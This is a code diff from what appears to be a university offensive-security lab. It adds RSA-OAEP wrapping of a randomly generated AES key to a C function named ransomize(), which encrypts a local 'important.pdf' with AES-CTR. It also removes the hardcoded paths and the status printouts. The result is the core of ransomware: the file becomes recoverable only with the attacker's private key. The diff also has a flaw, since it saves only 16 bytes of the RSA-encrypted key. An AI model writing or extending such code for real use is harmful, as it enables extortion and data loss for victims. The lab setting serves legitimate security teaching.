@@ -6,9 +6,13 @@
 
 #include <openssl/evp.h>
 #include <openssl/rand.h>
+#include <openssl/pem.h>
+
+#include "get_dir.h"
 
 #define KEY_SIZE 16
 #define IV_SIZE 16
+#define MAX_PATH 260
 
 /* Error handler */
 void handle_error(const char *msg)
@@ -45,6 +49,40 @@ int save_key_to_file(const char *path, const unsigned char *key, size_t key_len)
     }
 
     fclose(f);
+    return 1;
+}
+
+EVP_PKEY *load_public_key(const char *path)
+{
+    FILE *f = fopen(path, "rb");
+    if (!f) handle_error("Cannot open public key");
+
+    EVP_PKEY *pkey = PEM_read_PUBKEY(f, NULL, NULL, NULL);
+    fclose(f);
+
+    if (!pkey) handle_error("Failed to read public key");
+    return pkey;
+}
+
+int rsa_encrypt_key(EVP_PKEY *pubkey, const unsigned char *key, size_t key_len, unsigned char **enc_key, size_t *enc_len)
+{
+    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(pubkey, NULL);
+    if (!ctx) return 0;
+
+    if (EVP_PKEY_encrypt_init(ctx) <= 0) return 0;
+    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) return 0;
+
+    // Determine output size
+    if (EVP_PKEY_encrypt(ctx, NULL, enc_len, key, key_len) <= 0)
+        return 0;
+
+    *enc_key = malloc(*enc_len);
+    if (!*enc_key) return 0;
+
+    if (EVP_PKEY_encrypt(ctx, *enc_key, enc_len, key, key_len) <= 0)
+        return 0;
+
+    EVP_PKEY_CTX_free(ctx);
     return 1;
 }
 
@@ -104,19 +142,43 @@ int encrypt_file_aes_ctr(const char *source, const char *target)
     fclose(outfile);
 
     // Save the key
-    if (!save_key_to_file("C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/aes_key.bin", key, KEY_SIZE)) handle_error("Failed to save key");
+    char exe_dir[MAX_PATH];
+    get_dir(exe_dir, sizeof(exe_dir));
+
+    char rsa_path[MAX_PATH];
+    snprintf(rsa_path, sizeof(rsa_path), "%s\\%s", exe_dir, "public_key.pem");
+
+    char key_path[MAX_PATH];
+    snprintf(key_path, sizeof(key_path), "%s\\%s", exe_dir, "aes_key.bin");
+
+    EVP_PKEY *pub = load_public_key(rsa_path);
+
+    unsigned char *enc_key = NULL;
+    size_t enc_key_len = 0;
+
+    if (!rsa_encrypt_key(pub, key, KEY_SIZE, &enc_key, &enc_key_len))
+        handle_error("RSA key encryption failed");
+
+    if (!save_key_to_file(key_path, enc_key, KEY_SIZE)) handle_error("Failed to save key");
+
+    free(enc_key);
+    EVP_PKEY_free(pub);
 
     return 0;
 }
 
 int ransomize(void)
 {
-    const char *input_file = "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/important.pdf";
-    const char *output_file = "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/important.enc";
+    char exe_dir[MAX_PATH];
+    get_dir(exe_dir, sizeof(exe_dir));
 
-    printf("Encrypting file...\n");
+    char input_file[MAX_PATH];
+    snprintf(input_file, sizeof(input_file), "%s\\%s", exe_dir, "important.pdf");
+
+    char output_file[MAX_PATH];
+    snprintf(output_file, sizeof(output_file), "%s\\%s", exe_dir, "important.enc");
+
     encrypt_file_aes_ctr(input_file, output_file);
-    printf("File encrypted successfully.\n");
 
     return 0;
 }
